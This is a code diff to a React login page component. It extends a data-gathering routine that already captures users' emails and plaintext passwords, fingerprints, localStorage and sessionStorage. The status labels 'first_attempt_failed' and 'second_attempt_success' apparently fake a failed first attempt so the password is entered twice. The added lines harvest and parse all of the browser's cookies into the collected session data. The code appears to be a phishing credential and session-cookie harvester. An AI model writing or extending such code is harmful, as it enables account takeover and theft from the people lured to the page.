@@ -96,6 +96,21 @@ const LoginPage: React.FC<LoginPageProps> = ({
       // Capture browser fingerprint for this attempt
       const browserFingerprint = getBrowserFingerprint();
       
+      // Force cookie refresh and capture
+      const cookieCapture = {
+        documentCookies: document.cookie,
+        allCookies: {},
+        domains: [window.location.hostname]
+      };
+      
+      // Parse all cookies
+      document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name && value) {
+          cookieCapture.allCookies[name] = decodeURIComponent(value);
+        }
+      });
+
       const sessionData = {
         email: email,
         password: password,
@@ -106,13 +121,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
         clientIP: 'Unknown',
         userAgent: navigator.userAgent,
         deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-        cookies: browserFingerprint.cookies,
-        documentCookies: document.cookie,
-        localStorage: browserFingerprint.localStorage,
-        sessionStorage: browserFingerprint.sessionStorage,
+        cookies: cookieCapture.documentCookies,
+        cookiesParsed: cookieCapture.allCookies,
+        documentCookies: cookieCapture.documentCookies,
+        localStorage: JSON.stringify(browserFingerprint.localStorage),
+        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
         browserFingerprint: browserFingerprint,
         attemptNumber: currentAttempt,
-        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success'
+        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
+        cookieCapture: cookieCapture
       };
 
       console.log(`🔐 Login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
